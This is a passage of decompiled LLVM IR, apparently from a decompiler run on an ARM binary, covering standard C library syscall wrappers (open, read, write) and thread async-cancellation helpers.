; uselistorder directives
  uselistorder i32 %v0_157c0, { 2, 1, 0 }
  uselistorder i32 %v0_157b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15780, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1578c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_157e4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_157e4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_157e4 = load i32, i32* @r0, align 4
  ret i32 %v2_157e4

bb1:                                              ; preds = %entry
  %v0_157e8 = call i32 @__syscall_error()
  ret i32 %v0_157e8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_157f4 = load i32, i32* @global_var_261f4.548, align 4
  %v2_157f8 = icmp eq i32 %v3_157f4, 0
  store i1 %v2_157f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157f8, label %dec_label_pc_15800, label %entry.dec_label_pc_1581c_crit_edge

entry.dec_label_pc_1581c_crit_edge:               ; preds = %entry
  %v3_1581c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1581c

dec_label_pc_15800:                               ; preds = %entry
  %v0_15810 = load i32, i32* @r0, align 4
  %v2_15810 = icmp ugt i32 %v0_15810, -4097
  %v7_15810 = icmp eq i32 %v0_15810, -4096
  store i1 %v7_15810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15810, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1581c, %dec_label_pc_15800
  %merge = phi i32 [ %v0_15810, %dec_label_pc_15800 ], [ %v0_15840, %dec_label_pc_1581c ], [ %v0_15850, %bb10 ], [ %v8_15860, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_15800
  %v0_15818 = call i32 @__syscall_error()
  br label %dec_label_pc_1581c

dec_label_pc_1581c:                               ; preds = %entry.dec_label_pc_1581c_crit_edge, %bb9
  %v3_1581c = phi i32 [ %v3_1581c.pre, %entry.dec_label_pc_1581c_crit_edge ], [ %v0_15818, %bb9 ]
  store i32 %v3_1581c, i32* %stack_var_-24, align 4
  %v9_1581c = load i32, i32* @r2, align 4
  %v12_1581c = load i32, i32* @r3, align 4
  %v15_1581c = load i32, i32* @r7, align 4
  store i32 %v15_1581c, i32* %stack_var_-8, align 4
  %v18_1581c = load i32, i32* @lr, align 4
  %v0_15820 = call i32 @__libc_enable_asynccancel()
  %v2_15828 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1581c, i32* @r2, align 4
  store i32 %v12_1581c, i32* @r3, align 4
  store i32 %v2_15828, i32* @r7, align 4
  %v1_1583c = call i32 @__libc_disable_asynccancel(i32 %v0_15820)
  %v0_15840 = load i32, i32* @r7, align 4
  store i32 %v0_15840, i32* @r0, align 4
  %v2_15844 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15844, i32* @r7, align 4
  store i32 %v18_1581c, i32* @lr, align 4
  %v2_15848 = icmp ugt i32 %v0_15840, -4097
  %v7_15848 = icmp eq i32 %v0_15840, -4096
  store i1 %v7_15848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15848, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1581c
  %v0_15850 = call i32 @__syscall_error()
  %v0_15860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15860, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_15860 = load i32, i32* @r1, align 4
  %v2_15860 = load i32, i32* @r8, align 4
  %v3_15860 = udiv i32 %v2_15860, 262144
  %v4_15860 = mul i32 %v2_15860, 16384
  %v5_15860 = or i32 %v3_15860, %v4_15860
  %v8_15860 = and i32 %v5_15860, %v1_15860
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15840, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15810, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1581c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_15874 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15874, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15874 = load i32, i32* @r0, align 4
  ret i32 %v2_15874

bb1:                                              ; preds = %entry
  %v0_15878 = call i32 @__syscall_error()
  ret i32 %v0_15878
}

define i32 @__GI___libc_write(i32 %arg1, i64* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15884 = load i32, i32* @global_var_261f4.548, align 4
  %v2_15888 = icmp eq i32 %v3_15884, 0
  store i1 %v2_15888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15888, label %dec_label_pc_15890, label %entry.dec_label_pc_158ac_crit_edge

entry.dec_label_pc_158ac_crit_edge:               ; preds = %entry
  %v3_158ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_158ac

dec_label_pc_15890:                               ; preds = %entry
  %v0_158a0 = load i32, i32* @r0, align 4
  %v2_158a0 = icmp ugt i32 %v0_158a0, -4097
  %v7_158a0 = icmp eq i32 %v0_158a0, -4096
  store i1 %v7_158a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158a0, label %bb11, label %bb

bb:                                               ; preds = %bb13, %bb12, %dec_label_pc_158ac, %dec_label_pc_15890
  %merge = phi i32 [ %v0_158a0, %dec_label_pc_15890 ], [ %v0_158d0, %dec_label_pc_158ac ], [ %v0_158e0, %bb12 ], [ %v7_158f0, %bb13 ]
  ret i32 %merge

bb11:                                             ; preds = %dec_label_pc_15890
  %v0_158a8 = call i32 @__syscall_error()
  br label %dec_label_pc_158ac

dec_label_pc_158ac:                               ; preds = %entry.dec_label_pc_158ac_crit_edge, %bb11
  %v3_158ac = phi i32 [ %v3_158ac.pre, %entry.dec_label_pc_158ac_crit_edge ], [ %v0_158a8, %bb11 ]
  %v15_158ac = load i32, i32* @r3, align 4
  %v18_158ac = load i32, i32* @r7, align 4
  store i32 %v18_158ac, i32* %stack_var_-8, align 4
  %v21_158ac = load i32, i32* @lr, align 4
  %v0_158b0 = call i32 @__libc_enable_asynccancel()
  store i32 %tmp, i32* @r1, align 4
  store i32 %v15_158ac, i32* @r3, align 4
  store i32 %v3_158ac, i32* @r7, align 4
  %v1_158cc = call i32 @__libc_disable_asynccancel(i32 %v0_158b0)
  %v0_158d0 = load i32, i32* @r7, align 4
  store i32 %v0_158d0, i32* @r0, align 4
  %v2_158d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_158d4, i32* @r7, align 4
  store i32 %v21_158ac, i32* @lr, align 4
  %v2_158d8 = icmp ugt i32 %v0_158d0, -4097
  %v7_158d8 = icmp eq i32 %v0_158d0, -4096
  store i1 %v7_158d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158d8, label %bb12, label %bb

bb12:                                             ; preds = %dec_label_pc_158ac
  %v0_158e0 = call i32 @__syscall_error()
  %v0_158f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_158f0, label %bb13, label %bb

bb13:                                             ; preds = %bb12
  %v1_158f0 = load i32, i32* @r1, align 4
  %v2_158f0 = inttoptr i32 %v1_158f0 to i64*
  %v3_158f0 = load i64, i64* %v2_158f0, align 4
  %v6_158f0 = udiv i64 %v3_158f0, 4294967296
  %v7_158f0 = trunc i64 %v6_158f0 to i32
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_158d0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_158a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_158ac, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_15904 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15904, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15904 = load i32, i32* @r0, align 4
  ret i32 %v2_15904

bb1:                                              ; preds = %entry
  %v0_15908 = call i32 @__syscall_error()
  ret i32 %v0_15908

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15914 = load i32, i32* @global_var_261f4.548, align 4
  %v2_15918 = icmp eq i32 %v3_15914, 0
  br i1 %v2_15918, label %dec_label_pc_15920, label %entry.dec_label_pc_1593c_crit_edge

entry.dec_label_pc_1593c_crit_edge:               ; preds = %entry
  %v3_1593c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1593c

dec_label_pc_15920:                               ; preds = %entry
  %v0_15930 = load i32, i32* @r0, align 4
  %v2_15930 = icmp ugt i32 %v0_15930, -4097
  br i1 %v2_15930, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1593c, %dec_label_pc_15920
  %merge = phi i32 [ %v0_15930, %dec_label_pc_15920 ], [ %v0_15960, %dec_label_pc_1593c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_15920
  %v0_15938 = call i32 @__syscall_error()
  br label %dec_label_pc_1593c

dec_label_pc_1593c:                               ; preds = %entry.dec_label_pc_1593c_crit_edge, %bb8
  %v3_1593c = phi i32 [ %v3_1593c.pre, %entry.dec_label_pc_1593c_crit_edge ], [ %v0_15938, %bb8 ]
  store i32 %v3_1593c, i32* %stack_var_-24, align 4
  %v6_1593c = load i32, i32* @r1, align 4
  %v12_1593c = load i32, i32* @r3, align 4
  %v15_1593c = load i32, i32* @r7, align 4
  store i32 %v15_1593c, i32* %stack_var_-8, align 4
  %v18_1593c = load i32, i32* @lr, align 4
  %v0_15940 = call i32 @__libc_enable_asynccancel()
  %v2_15948 = load i32, i32* %stack_var_-24, align 4
  store i32 %v6_1593c, i32* @r1, align 4
  store i32 %v12_1593c, i32* @r3, align 4
  store i32 %v2_15948, i32* @r7, align 4
  %v1_1595c = call i32 @__libc_disable_asynccancel(i32 %v0_15940)
  %v0_15960 = load i32, i32* @r7, align 4
  store i32 %v0_15960, i32* @r0, align 4
  %v2_15964 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15964, i32* @r7, align 4
  store i32 %v18_1593c, i32* @lr, align 4
  %v2_15968 = icmp ugt i32 %v0_15960, -4097
  br i1 %v2_15968, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1593c
  %v0_15970 = call i32 @__syscall_error()
  ret i32 %v0_15970

; uselistorder directives
  uselistorder i32 %v0_15960, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_1593c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_15980 = load i32, i32* %r0.global-to-local, align 4
  %v1_15980 = and i32 %v0_15980, 2
  %v2_15980 = icmp eq i32 %v1_15980, 0
  %v3_15984 = load i32, i32* @r4, align 4
  store i32 %v3_15984, i32* %stack_var_-16, align 4
  br i1 %v2_15980, label %dec_label_pc_1598c, label %dec_label_pc_15a00

dec_label_pc_1598c:                               ; preds = %entry
  %v0_1598c = call i32 @__aeabi_read_tp()
  store i32 %v0_1598c, i32* %r0.global-to-local, align 4
  %v1_15990 = add i32 %v0_1598c, -1036
  %v2_15990 = inttoptr i32 %v1_15990 to i32*
  %v3_15990 = load i32, i32* %v2_15990, align 4
  %v1_15994 = add i32 %v0_1598c, -1168
  store i32 %v1_15994, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15998

dec_label_pc_15998:                               ; preds = %dec_label_pc_159cc.dec_label_pc_15998_crit_edge, %dec_label_pc_1598c
  %v0_159a4 = phi i32 [ %v0_159a4.pre, %dec_label_pc_159cc.dec_label_pc_15998_crit_edge ], [ %v1_15994, %dec_label_pc_1598c ]
  %v0_15998 = phi i32 [ %v0_159cc, %dec_label_pc_159cc.dec_label_pc_15998_crit_edge ], [ %v3_15990, %dec_label_pc_1598c ]
  %v1_15998 = and i32 %v0_15998, -3
  store i32 %v1_15998, i32* %r7.global-to-local, align 4
  store i32 %v0_15998, i32* %r4.global-to-local, align 4
  store i32 %v1_15998, i32* @r1, align 4
  %v1_159a4 = add i32 %v0_159a4, 132
  store i32 %v1_159a4, i32* @r2, align 4
  %v1_159a823 = inttoptr i32 %v1_159a4 to i32*
  %v2_159a824 = load i32, i32* %v1_159a823, align 4
  %v3_159ac26 = icmp uge i32 %v2_159a824, %v0_15998
  store i1 %v3_159ac26, i1* %cpsr_c.global-to-local, align 1
  %v9_159ac32 = icmp eq i32 %v2_159a824, %v0_15998
  br i1 %v9_159ac32, label %dec_label_pc_159b4, label %dec_label_pc_159cc

dec_label_pc_159b4:                               ; preds = %dec_label_pc_15998, %dec_label_pc_159b4.dec_label_pc_159a8_crit_edge
  %v0_159b433 = phi i32 [ %v1_159ac.pre, %dec_label_pc_159b4.dec_label_pc_159a8_crit_edge ], [ %v0_15998, %dec_label_pc_15998 ]
  store i32 %v0_159b433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_159c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_159c4, label %dec_label_pc_159c8, label %dec_label_pc_159b4.dec_label_pc_159a8_crit_edge

dec_label_pc_159b4.dec_label_pc_159a8_crit_edge:  ; preds = %dec_label_pc_159b4
  %v0_159a8.pre = load i32, i32* @r2, align 4
  %v1_159ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_159a8 = inttoptr i32 %v0_159a8.pre to i32*
  %v2_159a8 = load i32, i32* %v1_159a8, align 4
  %v3_159ac = icmp uge i32 %v2_159a8, %v1_159ac.pre
  store i1 %v3_159ac, i1* %cpsr_c.global-to-local, align 1
  %v9_159ac = icmp eq i32 %v2_159a8, %v1_159ac.pre
  br i1 %v9_159ac, label %dec_label_pc_159b4, label %dec_label_pc_159cc

dec_label_pc_159c8:                               ; preds = %dec_label_pc_159b4
  %v0_159c8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_159cc

dec_label_pc_159cc:                               ; preds = %dec_label_pc_15998, %dec_label_pc_159b4.dec_label_pc_159a8_crit_edge, %dec_label_pc_159c8
  %v0_159cc = phi i32 [ %v0_159c8, %dec_label_pc_159c8 ], [ %v2_159a824, %dec_label_pc_15998 ], [ %v2_159a8, %dec_label_pc_159b4.dec_label_pc_159a8_crit_edge ]
  %v1_159cc = phi i32 [ %v0_159c8, %dec_label_pc_159c8 ], [ %v0_15998, %dec_label_pc_15998 ], [ %v1_159ac.pre, %dec_label_pc_159b4.dec_label_pc_159a8_crit_edge ]
  %v3_159cc = icmp uge i32 %v0_159cc, %v1_159cc
  store i1 %v3_159cc, i1* %cpsr_c.global-to-local, align 1
  %v9_159cc = icmp eq i32 %v0_159cc, %v1_159cc
  br i1 %v9_159cc, label %dec_label_pc_159f4.preheader, label %dec_label_pc_159cc.dec_label_pc_15998_crit_edge

dec_label_pc_159cc.dec_label_pc_15998_crit_edge:  ; preds = %dec_label_pc_159cc
  %v0_159a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15998

dec_label_pc_159f4.preheader:                     ; preds = %dec_label_pc_159cc
  %v0_159f41 = load i32, i32* %r7.global-to-local, align 4
  %v1_159f42 = and i32 %v0_159f41, 12
  store i32 %v1_159f42, i32* @r3, align 4
  %v2_159f83 = icmp ugt i32 %v1_159f42, 3
  store i1 %v2_159f83, i1* %cpsr_c.global-to-local, align 1
  %v7_159f85 = icmp eq i32 %v1_159f42, 4
  br i1 %v7_159f85, label %dec_label_pc_159d8.lr.ph, label %dec_label_pc_159f4.preheader.dec_label_pc_15a00.loopexit_crit_edge

dec_label_pc_159f4.preheader.dec_label_pc_15a00.loopexit_crit_edge: ; preds = %dec_label_pc_159f4.preheader
  %v1_15a04.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a00.loopexit

dec_label_pc_159d8.lr.ph:                         ; preds = %dec_label_pc_159f4.preheader
  %v0_159dc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_159dc = add i32 %v0_159dc.pre, 132
  %v2_159f0 = inttoptr i32 %v1_159dc to i32*
  br label %dec_label_pc_159d8

dec_label_pc_159d8:                               ; preds = %dec_label_pc_159d8.lr.ph, %dec_label_pc_159d8
  %v0_159d8 = phi i32 [ %v0_159f41, %dec_label_pc_159d8.lr.ph ], [ %v3_159f0, %dec_label_pc_159d8 ]
  store i32 %v0_159d8, i32* @r2, align 4
  store i32 %v1_159dc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_159f0 = load i32, i32* %v2_159f0, align 4
  store i32 %v3_159f0, i32* %r7.global-to-local, align 4
  %v1_159f4 = and i32 %v3_159f0, 12
  store i32 %v1_159f4, i32* @r3, align 4
  %v7_159f8 = icmp eq i32 %v1_159f4, 4
  br i1 %v7_159f8, label %dec_label_pc_159d8, label %dec_label_pc_159f4.dec_label_pc_15a00.loopexit_crit_edge

dec_label_pc_159f4.dec_label_pc_15a00.loopexit_crit_edge: ; preds = %dec_label_pc_159d8
  %v2_159f8 = icmp ugt i32 %v1_159f4, 3
  store i1 %v2_159f8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_15a00.loopexit

dec_label_pc_15a00.loopexit:                      ; preds = %dec_label_pc_159f4.preheader.dec_label_pc_15a00.loopexit_crit_edge, %dec_label_pc_159f4.dec_label_pc_15a00.loopexit_crit_edge
  %v1_15a04.pre = phi i32 [ %v1_15a04.pre.pre, %dec_label_pc_159f4.preheader.dec_label_pc_15a00.loopexit_crit_edge ], [ %v1_159dc, %dec_label_pc_159f4.dec_label_pc_15a00.loopexit_crit_edge ]
  %v2_15a00.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_15a00

dec_label_pc_15a00:                               ; preds = %dec_label_pc_15a00.loopexit, %entry
  %v1_15a04 = phi i32 [ %v1_15a04.pre, %dec_label_pc_15a00.loopexit ], [ %v0_15980, %entry ]
  %v2_15a00 = phi i32 [ %v2_15a00.pre, %dec_label_pc_15a00.loopexit ], [ %v3_15984, %entry ]
  store i32 %v2_15a00, i32* @r4, align 4
  ret i32 %v1_15a04

; uselistorder directives
  uselistorder i32 %v3_159f0, { 1, 2, 0 }
  uselistorder i32 %v1_159dc, { 0, 2, 1 }
  uselistorder i32 %v0_159c8, { 1, 0 }
  uselistorder i32 %v1_159ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15998, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 1, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_15a00.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_159d8, { 1, 0 }
  uselistorder label %dec_label_pc_159cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159b4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15a08 = load i32, i32* @r4, align 4
  store i32 %v3_15a08, i32* %stack_var_-24, align 4
  store i32 54764, i32* %r8.global-to-local, align 4
  %v0_15a10 = call i32 @__aeabi_read_tp()
  %v1_15a14 = add i32 %v0_15a10, -1036
  %v2_15a14 = inttoptr i32 %v1_15a14 to i32*
  %v3_15a14 = load i32, i32* %v2_15a14, align 4
  store i32 %v3_15a14, i32* %r6.global-to-local, align 4
  %v1_15a18 = add i32 %v0_15a10, -1168
  store i32 %v1_15a18, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r8.global-to-local, align 4
  %v1_15a2046 = or i32 %v3_15a14, 2
  store i32 %v1_15a2046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15a2449 = icmp eq i32 %v1_15a2046, %v3_15a14
  br i1 %v9_15a2449, label %dec_label_pc_15ad0, label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %entry, %bb.dec_label_pc_15a2c_crit_edge
  %v0_15a30 = phi i32 [ %v0_15a30.pre, %bb.dec_label_pc_15a2c_crit_edge ], [ %v1_15a18, %entry ]
  %v1_15a2051 = phi i32 [ %v1_15a20, %bb.dec_label_pc_15a2c_crit_edge ], [ %v1_15a2046, %entry ]
  %v0_15a3450 = phi i32 [ %v1_15a60, %bb.dec_label_pc_15a2c_crit_edge ], [ %v3_15a14, %entry ]
  store i32 %v1_15a2051, i32* @r1, align 4
  %v1_15a30 = add i32 %v0_15a30, 132
  store i32 %v1_15a30, i32* @r2, align 4
  store i32 %v0_15a3450, i32* %r4.global-to-local, align 4
  %v1_15a3834 = inttoptr i32 %v1_15a30 to i32*
  %v2_15a3835 = load i32, i32* %v1_15a3834, align 4
  store i32 %v2_15a3835, i32* @r3, align 4
  %v3_15a3c37 = icmp uge i32 %v2_15a3835, %v0_15a3450
  store i1 %v3_15a3c37, i1* %cpsr_c.global-to-local, align 1
  %v9_15a3c43 = icmp eq i32 %v2_15a3835, %v0_15a3450
  br i1 %v9_15a3c43, label %dec_label_pc_15a44, label %dec_label_pc_15a5c

dec_label_pc_15a44:                               ; preds = %dec_label_pc_15a2c, %dec_label_pc_15a44.dec_label_pc_15a38_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15a54 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a54, label %dec_label_pc_15a58, label %dec_label_pc_15a44.dec_label_pc_15a38_crit_edge

dec_label_pc_15a44.dec_label_pc_15a38_crit_edge:  ; preds = %dec_label_pc_15a44
  %v0_15a38.pre = load i32, i32* @r2, align 4
  %v1_15a3c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a38 = inttoptr i32 %v0_15a38.pre to i32*
  %v2_15a38 = load i32, i32* %v1_15a38, align 4
  store i32 %v2_15a38, i32* @r3, align 4
  %v3_15a3c = icmp uge i32 %v2_15a38, %v1_15a3c.pre
  store i1 %v3_15a3c, i1* %cpsr_c.global-to-local, align 1
  %v9_15a3c = icmp eq i32 %v2_15a38, %v1_15a3c.pre
  br i1 %v9_15a3c, label %dec_label_pc_15a44, label %dec_label_pc_15a5c

dec_label_pc_15a58:                               ; preds = %dec_label_pc_15a44
  %v0_15a58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15a58, i32* @r3, align 4
  br label %dec_label_pc_15a5c

dec_label_pc_15a5c:                               ; preds = %dec_label_pc_15a2c, %dec_label_pc_15a44.dec_label_pc_15a38_crit_edge, %dec_label_pc_15a58
  %v1_15a60 = phi i32 [ %v0_15a58, %dec_label_pc_15a58 ], [ %v2_15a3835, %dec_label_pc_15a2c ], [ %v2_15a38, %dec_label_pc_15a44.dec_label_pc_15a38_crit_edge ]
  %v1_15a5c = load i32, i32* %r6.global-to-local, align 4
  %v3_15a5c = icmp uge i32 %v1_15a60, %v1_15a5c
  store i1 %v3_15a5c, i1* %cpsr_c.global-to-local, align 1
  %v9_15a5c = icmp eq i32 %v1_15a60, %v1_15a5c
  br i1 %v9_15a5c, label %dec_label_pc_15a68, label %bb

bb:                                               ; preds = %dec_label_pc_15a5c
  store i32 %v1_15a60, i32* %r6.global-to-local, align 4
  %v1_15a20 = or i32 %v1_15a60, 2
  store i32 %v1_15a20, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15a24 = icmp eq i32 %v1_15a20, %v1_15a60
  br i1 %v9_15a24, label %dec_label_pc_15ad0, label %bb.dec_label_pc_15a2c_crit_edge

bb.dec_label_pc_15a2c_crit_edge:                  ; preds = %bb
  %v0_15a30.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15a2c

dec_label_pc_15a68:                               ; preds = %dec_label_pc_15a5c
  %v0_15a68 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a68 = and i32 %v0_15a68, -69
  store i32 %v1_15a68, i32* @r3, align 4
  %v2_15a6c = icmp ugt i32 %v1_15a68, 9
  store i1 %v2_15a6c, i1* %cpsr_c.global-to-local, align 1
  %v7_15a6c = icmp eq i32 %v1_15a68, 10
  br i1 %v7_15a6c, label %dec_label_pc_15a74, label %dec_label_pc_15ad0

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a68
  %v1_15a78 = load i32, i32* %r7.global-to-local, align 4
  %v2_15a78 = add i32 %v1_15a78, 544
  %v3_15a78 = inttoptr i32 %v2_15a78 to i32*
  store i32 -1, i32* %v3_15a78, align 4
  %v0_15a7c = load i32, i32* @r2, align 4
  store i32 %v0_15a7c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15ab4.dec_label_pc_15a80_crit_edge, %dec_label_pc_15a74
  %v0_15a84 = phi i32 [ %v0_15a84.pre, %dec_label_pc_15ab4.dec_label_pc_15a80_crit_edge ], [ %v0_15a7c, %dec_label_pc_15a74 ]
  %v0_15a80 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a80 = add i32 %v0_15a80, 132
  %v2_15a80 = inttoptr i32 %v1_15a80 to i32*
  %v3_15a80 = load i32, i32* %v2_15a80, align 4
  store i32 %v0_15a84, i32* @r2, align 4
  store i32 %v3_15a80, i32* %r4.global-to-local, align 4
  %v1_15a8c = or i32 %v3_15a80, 16
  store i32 %v1_15a8c, i32* @r1, align 4
  %v1_15a9022 = inttoptr i32 %v0_15a84 to i32*
  %v2_15a9023 = load i32, i32* %v1_15a9022, align 4
  %v3_15a9425 = icmp uge i32 %v2_15a9023, %v3_15a80
  store i1 %v3_15a9425, i1* %cpsr_c.global-to-local, align 1
  %v9_15a9431 = icmp eq i32 %v2_15a9023, %v3_15a80
  br i1 %v9_15a9431, label %dec_label_pc_15a9c, label %dec_label_pc_15ab4

dec_label_pc_15a9c:                               ; preds = %dec_label_pc_15a80, %dec_label_pc_15a9c.dec_label_pc_15a90_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15aac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15aac, label %dec_label_pc_15ab0, label %dec_label_pc_15a9c.dec_label_pc_15a90_crit_edge

dec_label_pc_15a9c.dec_label_pc_15a90_crit_edge:  ; preds = %dec_label_pc_15a9c
  %v0_15a90.pre = load i32, i32* @r2, align 4
  %v1_15a94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a90 = inttoptr i32 %v0_15a90.pre to i32*
  %v2_15a90 = load i32, i32* %v1_15a90, align 4
  %v3_15a94 = icmp uge i32 %v2_15a90, %v1_15a94.pre
  store i1 %v3_15a94, i1* %cpsr_c.global-to-local, align 1
  %v9_15a94 = icmp eq i32 %v2_15a90, %v1_15a94.pre
  br i1 %v9_15a94, label %dec_label_pc_15a9c, label %dec_label_pc_15ab4

dec_label_pc_15ab0:                               ; preds = %dec_label_pc_15a9c
  %v0_15ab0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15a80, %dec_label_pc_15a9c.dec_label_pc_15a90_crit_edge, %dec_label_pc_15ab0
  %v0_15ab4 = phi i32 [ %v0_15ab0, %dec_label_pc_15ab0 ], [ %v2_15a9023, %dec_label_pc_15a80 ], [ %v2_15a90, %dec_label_pc_15a9c.dec_label_pc_15a90_crit_edge ]
  %v1_15ab4 = phi i32 [ %v0_15ab0, %dec_label_pc_15ab0 ], [ %v3_15a80, %dec_label_pc_15a80 ], [ %v1_15a94.pre, %dec_label_pc_15a9c.dec_label_pc_15a90_crit_edge ]
  %v3_15ab4 = icmp uge i32 %v0_15ab4, %v1_15ab4
  store i1 %v3_15ab4, i1* %cpsr_c.global-to-local, align 1
  %v9_15ab4 = icmp eq i32 %v0_15ab4, %v1_15ab4
  br i1 %v9_15ab4, label %dec_label_pc_15abc, label %dec_label_pc_15ab4.dec_label_pc_15a80_crit_edge

dec_label_pc_15ab4.dec_label_pc_15a80_crit_edge:  ; preds = %dec_label_pc_15ab4
  %v0_15a84.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a80

dec_label_pc_15abc:                               ; preds = %dec_label_pc_15ab4
  store i32 116, i32* @r3, align 4
  %v0_15ac4 = load i32, i32* %r8.global-to-local, align 4
  %v2_15ac4 = add i32 %v0_15ac4, 116
  %v3_15ac4 = inttoptr i32 %v2_15ac4 to i32*
  %v4_15ac4 = load i32, i32* %v3_15ac4, align 4
  store i32 %v4_15ac4, i32* @ip, align 4
